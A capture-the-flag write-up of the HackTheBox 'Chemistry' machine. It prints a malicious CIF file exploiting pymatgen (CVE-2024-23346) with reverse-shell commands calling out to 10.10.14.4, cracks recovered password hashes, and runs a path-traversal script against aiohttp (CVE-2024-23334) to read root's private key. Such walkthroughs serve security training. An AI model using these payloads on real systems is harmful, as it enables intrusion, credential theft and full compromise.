---
title: "Chemistry"
description: "Writeup for the 'Easy' rated machine: Chemistry"
date: 2025-03-08 00:00:00 +0100
categories: [CTFs, HackTheBox]
tags: [writeup, hackthebox]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/htb/chemistry/tn.png
---

### Overview
___
Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the `pymatgen` (CVE-2024-23346) Python library by uploading a malicious `CIF` file to the hosted `CIF Analyzer` website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as `rosa` user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called `AioHTTP` (CVE-2024-23334) which is used on the web application running internally to read the root flag. 

### Port Scanning
___
```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  upnp?   syn-ack
```

We got 2 ports open:
- 22 running ssh
- 5000 running a web server

### Website
___
Navigating to `http://10.10.11.38:5000`, we get the following page:

![](/assets/img/htb/chemistry/home_page.png)

The content of the home page already gives us a hint: `This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.`. 
We have the possibility to log in or to create an account.

#### Login Page
___
On the login page, I tried submitting some defaults credentials and quickly tested for basic sqli but without success:

![](/assets/img/htb/chemistry/login_page_invalid_creds.png)

#### Creating an account
___
We can try to register an account at `/register`

![](/assets/img/htb/chemistry/create_account.png)

After registering an account we get access to the following dashboard:

![](/assets/img/htb/chemistry/dashboard.png)

The website allows us to upload a CIF file. It also provides us with an example at `/static/example.cif`:

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

#### Exploit for CIF files
___
A searching for exploits involving CIF files, we find [this security report](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) showing how we can get RCE with a malicious CIF file using this POC:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Let's replace the command with a reverse shell:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.4 1337 >/tmp/f");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

And setup a listener:

```bash
nc -lvnp 1337
```

Now let's upload it:

![](/assets/img/htb/chemistry/upload_cif.png)

After clicking on upload, we see that we can view it or delete it:

![](/assets/img/htb/chemistry/after_upload.png)

If we click on view, we get a 500 Internal server error, and we don't get a reverse shell. 

![](/assets/img/htb/chemistry/500_err.png)

However if we replace the command with just `nc <IP> <PORT>`, we get a connection. In this case, we can upload the reverse shell, and then execute it

![](/assets/img/htb/chemistry/hosting_revshell.png)

The file `shell.sh` contains the following:

```bash
bash -i >& /dev/tcp/10.10.14.4/1337 0>&1
```

After, uploading and clicking on view, we see the file was downloaded:

![](/assets/img/htb/chemistry/web_server_hit.png)

We can now change the command, so that our reverse shell is executed 

![](/assets/img/htb/chemistry/exec_shell.png)

After re-uploading the file, and then clicking on View, we finally get a shell back:

![](/assets/img/htb/chemistry/got_shell.png)

### User
___
In our current directory, we find the source code of the website in `app.py` which also contains credentials:

![](/assets/img/htb/chemistry/db_pass.png)

After looking around some more, we find a the sqlite database inside the `instance` directory.

```bash
app@chemistry:~$ cd instance/
app@chemistry:~/instance$ ls
database.db
app@chemistry:~/instance$ file database.db
database.db: SQLite 3.x database, last written using SQLite version 3031001
```

Looking at the contents of this file with `strings`, we are able to get the hashes of the users:

![](/assets/img/htb/chemistry/hashes.png)

Let's try to crack the hash of the user `rosa`, since they are on the machine:

```
hashcat -m 0 '<HASH>' /usr/share/wordlists/rockyou.txt
```

![](/assets/img/htb/chemistry/rosa_cracked.png)

We can ssh as `rosa` and retrieve the user flag

![](/assets/img/htb/chemistry/user.png)

### Root
___
After some enumeration, we find out that something is running on `127.0.0.1:8080`

![](/assets/img/htb/chemistry/netstat.png)

We can forward that port to our machine with:

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

Now after going to `http://127.0.0.1:8080`, we get access to this website allowing us to list services:

![](/assets/img/htb/chemistry/monitoring_site.png)

Looking at the response headers, we see something unusual for the `Server` header (`Python/3.9 aiohttp/3.9.1`):

![](/assets/img/htb/chemistry/res_headers.png)

After some reasearch, we see that it might be vulnerable to CVE-2024-23334 which is a path traversal vulnerability. Using this [poc](https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh) (with some little changes):

```bash
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"

    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

We were able to retrieve the `/etc/passwd` file:

![](/assets/img/htb/chemistry/etc_passwd.png)

We can repeat the same process in order to read the private key of the root user:

![](/assets/img/htb/chemistry/id_rsa.png)

We can use it to login as root and retrieve the flag:

![](/assets/img/htb/chemistry/root.png)
